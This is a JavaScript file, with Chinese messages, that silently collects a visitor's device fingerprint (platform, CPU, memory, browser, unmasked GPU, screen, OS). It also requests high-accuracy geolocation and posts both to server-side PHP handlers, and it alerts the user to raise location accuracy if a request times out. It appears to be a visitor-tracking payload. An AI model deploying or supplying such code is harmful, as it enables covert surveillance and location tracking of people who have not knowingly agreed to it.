function information() {
  var ptf = navigator.platform;
  var cc = navigator.hardwareConcurrency;
  var ram = navigator.deviceMemory;
  var ver = navigator.userAgent;
  var str = ver;
  var os = ver;
  //gpu
  var canvas = document.createElement('canvas');
  var gl;
  var debugInfo;
  var ven;
  var ren;


  if (cc == undefined) {
    cc = '不可用';
  }

  //ram
  if (ram == undefined) {
    ram = '不可用';
  }

  //browser
  if (ver.indexOf('Firefox') != -1) {
    str = str.substring(str.indexOf(' Firefox/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else if (ver.indexOf('Chrome') != -1) {
    str = str.substring(str.indexOf(' Chrome/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else if (ver.indexOf('Safari') != -1) {
    str = str.substring(str.indexOf(' Safari/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else if (ver.indexOf('Edge') != -1) {
    str = str.substring(str.indexOf(' Edge/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else {
    brw = '不可用'
  }

  //gpu
  try {
    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
  }
  catch (e) { }
  if (gl) {
    debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
  }
  if (ven == undefined) {
    ven = '不可用';
  }
  if (ren == undefined) {
    ren = '不可用';
  }

  var ht = window.screen.height
  var wd = window.screen.width
  //os
  os = os.substring(0, os.indexOf(')'));
  os = os.split(';');
  os = os[1];
  if (os == undefined) {
    os = '不可用';
  }
  os = os.trim();
  //
  $.ajax({
    type: 'POST',
    url: 'info_handler.php',
    data: { Ptf: ptf, Brw: brw, Cc: cc, Ram: ram, Ven: ven, Ren: ren, Ht: ht, Wd: wd, Os: os },
    success: function () { },
    mimeType: 'text'
  });
}



function locate(callback, errCallback) {
  if (navigator.geolocation) {
    var optn = { enableHighAccuracy: true, timeout: 30000, maximumage: 0 };
    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
  }

  function showError(error) {
    var err_text;
    var err_status = 'failed';

    switch (error.code) {
      case error.PERMISSION_DENIED:
        err_text = '用户拒绝了地理位置请求';
        break;
      case error.POSITION_UNAVAILABLE:
        err_text = '位置信息不可用';
        break;
      case error.TIMEOUT:
        err_text = '获取用户位置请求超时';
        alert('请将定位模式设置为高精度...');
        break;
      case error.UNKNOWN_ERROR:
        err_text = '发生未知错误';
        break;
    }

    $.ajax({
      type: 'POST',
      url: 'error_handler.php',
      data: { Status: err_status, Error: err_text },
      success: errCallback(error, err_text),
      mimeType: 'text'
    });
  }
  function showPosition(position) {
    var lat = position.coords.latitude;
    if (lat) {
      lat = lat + ' 度';
    }
    else {
      lat = '不可用';
    }
    var lon = position.coords.longitude;
    if (lon) {
      lon = lon + ' 度';
    }
    else {
      lon = '不可用';
    }
    var acc = position.coords.accuracy;
    if (acc) {
      acc = acc + ' 米';
    }
    else {
      acc = '不可用';
    }
    var alt = position.coords.altitude;
    if (alt) {
      alt = alt + ' 米';
    }
    else {
      alt = '不可用';
    }
    var dir = position.coords.heading;
    if (dir) {
      dir = dir + ' 度';
    }
    else {
      dir = '不可用';
    }
    var spd = position.coords.speed;
    if (spd) {
      spd = spd + ' 米/秒';
    }
    else {
      spd = '不可用';
    }

    var ok_status = 'success';

    $.ajax({
      type: 'POST',
      url: 'result_handler.php',
      data: { Status: ok_status, Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd },
      success: callback,
      mimeType: 'text'
    });
  };
}

